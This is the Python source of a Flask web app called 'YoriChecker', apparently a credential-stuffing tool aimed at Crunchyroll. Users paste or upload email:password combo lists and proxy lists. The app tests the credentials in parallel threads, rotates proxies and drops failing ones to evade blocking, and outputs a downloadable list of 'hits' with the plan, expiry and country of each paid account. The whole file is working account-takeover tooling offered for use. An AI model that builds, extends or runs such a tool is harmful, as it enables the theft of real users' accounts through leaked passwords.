import os
import io
import json
import time
import uuid
import threading
from flask import Flask, request, render_template_string, send_file, Response
from concurrent.futures import ThreadPoolExecutor, as_completed
from checker import CrunchyrollChecker

app = Flask(__name__)

tasks = {}
task_lock = threading.Lock()

class ProxyManager:
    def __init__(self, proxies):
        self.proxies = [p.strip() for p in proxies if p.strip()]
        self.index = 0
        self.lock = threading.Lock()
        self.last_given = None

    def get_proxy(self):
        with self.lock:
            if not self.proxies:
                return None
            proxy = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            self.last_given = proxy
            return proxy

    def mark_bad(self, proxy=None):
        with self.lock:
            target = proxy or self.last_given
            if target and target in self.proxies:
                self.proxies.remove(target)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YoriChecker</title>
    <style>
        body { font-family: monospace; background: #121212; color: #e0e0e0; padding: 20px; max-width: 1000px; margin: 0 auto; }
        h2 { color: #f39c12; border-bottom: 1px solid #333; padding-bottom: 10px; }
        .container { display: flex; gap: 20px; flex-wrap: wrap; }
        .col { flex: 1; min-width: 300px; }
        label { display: block; margin-top: 15px; font-weight: bold; color: #bbb; }
        textarea { width: 100%; height: 150px; background: #1e1e1e; color: #0f0; border: 1px solid #333; padding: 10px; font-family: monospace; margin-top: 5px; box-sizing: border-box; }
        input[type="file"] { margin-top: 5px; color: #bbb; }
        button { margin-top: 20px; padding: 12px 24px; background: #f39c12; color: #000; border: none; cursor: pointer; font-weight: bold; font-size: 16px; width: 100%; }
        button:disabled { background: #555; cursor: not-allowed; color: #999; }
        button:hover:not(:disabled) { background: #e67e22; }
        #status { margin-top: 20px; padding: 10px; background: #1e1e1e; border-left: 4px solid #f39c12; font-weight: bold; display: none; }
        #progressContainer { display: none; margin-top: 20px; }
        .progress-bar-bg { background: #333; border-radius: 4px; overflow: hidden; height: 20px; }
        .progress-bar-fill { background: #f39c12; height: 100%; width: 0%; transition: width 0.3s; }
        #progressText { margin-top: 5px; text-align: center; font-weight: bold; }
    </style>
</head>
<body>
    <h2>YoriChecker // Crunchyroll</h2>
    <div class="container">
        <div class="col">
            <label>Combos (email:password)</label>
            <textarea id="combos_text" placeholder="user@domain.com:password123"></textarea>
            <input type="file" id="combos_file" accept=".txt">
        </div>
        <div class="col">
            <label>Proxies (ip:port:user:pass or ip:port)</label>
            <textarea id="proxies_text" placeholder="127.0.0.1:8080"></textarea>
            <input type="file" id="proxies_file" accept=".txt">
        </div>
    </div>
    
    <button id="validateBtn" onclick="validate()">VALIDATE</button>
    <div id="status"></div>
    
    <div id="progressContainer">
        <div class="progress-bar-bg">
            <div id="progressBar" class="progress-bar-fill"></div>
        </div>
        <div id="progressText"></div>
    </div>

    <script>
        async function validate() {
            const btn = document.getElementById('validateBtn');
            const status = document.getElementById('status');
            const progressContainer = document.getElementById('progressContainer');
            const progressBar = document.getElementById('progressBar');
            const progressText = document.getElementById('progressText');

            btn.disabled = true;
            status.style.display = 'block';
            status.textContent = "Processing... gnawing through the list.";
            status.style.borderLeftColor = '#f39c12';
            progressContainer.style.display = 'block';
            progressBar.style.width = '0%';
            progressText.textContent = 'Starting...';

            const formData = new FormData();
            formData.append('combos_text', document.getElementById('combos_text').value);
            formData.append('combos_file', document.getElementById('combos_file').files[0]);
            formData.append('proxies_text', document.getElementById('proxies_text').value);
            formData.append('proxies_file', document.getElementById('proxies_file').files[0]);

            try {
                const startRes = await fetch('/start_check', { method: 'POST', body: formData });
                if (!startRes.ok) throw new Error("Failed to start task");
                const { task_id } = await startRes.json();

                const evtSource = new EventSource(`/progress/${task_id}`);
                evtSource.onmessage = function(event) {
                    const data = JSON.parse(event.data);
                    if (data.done) {
                        evtSource.close();
                        window.location.href = `/download/${task_id}`;
                        btn.disabled = false;
                        status.textContent = "Done. Hits stashed and downloaded.";
                        status.style.borderLeftColor = '#2ecc71';
                    } else if (data.checked !== undefined) {
                        const pct = (data.checked / data.total) * 100;
                        progressBar.style.width = pct + '%';
                        progressText.textContent = `Checking ${data.checked} of ${data.total}`;
                    } else if (data.error) {
                        evtSource.close();
                        throw new Error(data.error);
                    }
                };
            } catch (err) {
                status.textContent = "Error: " + err.message;
                status.style.borderLeftColor = '#e74c3c';
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/start_check', methods=['POST'])
def start_check():
    combos_text = request.form.get('combos_text', '')
    combos_file = request.files.get('combos_file')
    proxies_text = request.form.get('proxies_text', '')
    proxies_file = request.files.get('proxies_file')

    def parse_lines(text, file):
        lines = text.splitlines()
        if file and file.filename:
            lines.extend(file.read().decode('utf-8').splitlines())
        return [l.strip() for l in lines if l.strip()]

    combos_lines = parse_lines(combos_text, combos_file)
    proxies_lines = parse_lines(proxies_text, proxies_file)

    combos = []
    for line in combos_lines:
        if ':' in line:
            parts = line.split(':', 1)
            if len(parts) == 2 and parts[0] and parts[1]:
                combos.append((parts[0], parts[1]))

    if not combos:
        return {"error": "No valid combos found"}, 400

    task_id = str(uuid.uuid4())
    with task_lock:
        tasks[task_id] = {
            'total': len(combos),
            'checked': 0,
            'done': False,
            'results': []
        }

    threading.Thread(target=run_checker, args=(task_id, combos, proxies_lines)).start()

    return {"task_id": task_id}

def run_checker(task_id, combos, proxies):
    proxy_mgr = ProxyManager(proxies) if proxies else None
    checker = CrunchyrollChecker(proxy_mgr)

    def check_combo(email, password):
        attempts = 0
        last_result = None
        while attempts < 3:
            result = checker.check_account(email, password)
            last_result = result
            if result.get('status') == 'ERROR' and 'proxy' in result.get('error', '').lower():
                if proxy_mgr:
                    proxy_mgr.mark_bad()
                attempts += 1
                continue
            break
        return last_result

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(check_combo, e, p): (e, p) for e, p in combos}
        for future in as_completed(futures):
            e, p = futures[future]
            res = future.result()
            with task_lock:
                tasks[task_id]['checked'] += 1
                tasks[task_id]['results'].append((e, p, res))

    with task_lock:
        tasks[task_id]['done'] = True

@app.route('/progress/<task_id>')
def progress(task_id):
    def stream():
        last_checked = -1
        while True:
            with task_lock:
                task = tasks.get(task_id)
                if not task:
                    yield f"data: {json.dumps({'error': 'Task not found'})}\n\n"
                    break
                checked = task['checked']
                total = task['total']
                done = task['done']
            
            if checked > last_checked:
                yield f"data: {json.dumps({'checked': checked, 'total': total})}\n\n"
                last_checked = checked
            
            if done:
                yield f"data: {json.dumps({'done': True})}\n\n"
                break
            
            time.sleep(0.5)
    return Response(stream(), mimetype='text/event-stream')

@app.route('/download/<task_id>')
def download(task_id):
    with task_lock:
        task = tasks.get(task_id)
    
    if not task:
        return "Task not found", 404

    hits = []
    fails = []
    errors = []
    frees = []

    for e, p, res in task['results']:
        if not res:
            fails.append(f"{e}:{p} | Unknown error")
            continue
        
        status = res.get('status')
        if status == 'HIT':
            d = res.get('data', {})
            hits.append(f"{e}:{p} | Plan: {d.get('plan', 'N/A')} | Expires: {d.get('expires', 'N/A')} | Country: {d.get('country', 'N/A')} | Auto-Renew: {d.get('renew', 'N/A')}")
        elif status == 'FREE':
            frees.append(f"{e}:{p} | Free account - no subscription")
        elif status == 'INVALID':
            fails.append(f"{e}:{p} | Invalid credentials")
        elif status == 'ERROR':
            err_msg = res.get('error', 'Unknown error')
            if 'proxy' in err_msg.lower() or 'timeout' in err_msg.lower() or 'connection' in err_msg.lower():
                errors.append(f"{e}:{p} | {err_msg}")
            else:
                fails.append(f"{e}:{p} | {err_msg}")
        else:
            fails.append(f"{e}:{p} | {status}")

    sep = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    output = []
    output.append(sep)
    output.append("HITS (Active Paid Subscriptions)")
    output.append(sep)
    output.extend(hits)
    output.append("\n" + sep)
    output.append("FAILED / INVALID")
    output.append(sep)
    output.extend(fails)
    output.append("\n" + sep)
    output.append("PROXY ERRORS / RETRIED")
    output.append(sep)
    output.extend(errors)
    output.append("\n" + sep)
    output.append("FREE ACCOUNTS (No active subscription)")
    output.append(sep)
    output.extend(frees)
    output.append("\n" + sep)
    output.append(f"SUMMARY: HITS: {len(hits)} | FAILED: {len(fails)} | PROXY ERRORS: {len(errors)} | FREE: {len(frees)}")
    output.append(sep)

    mem = io.BytesIO(("\n".join(output)).encode('utf-8'))
    return send_file(mem, as_attachment=True, download_name='yoricheckerwebsite.onrender.com/.txt', mimetype='text/plain')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
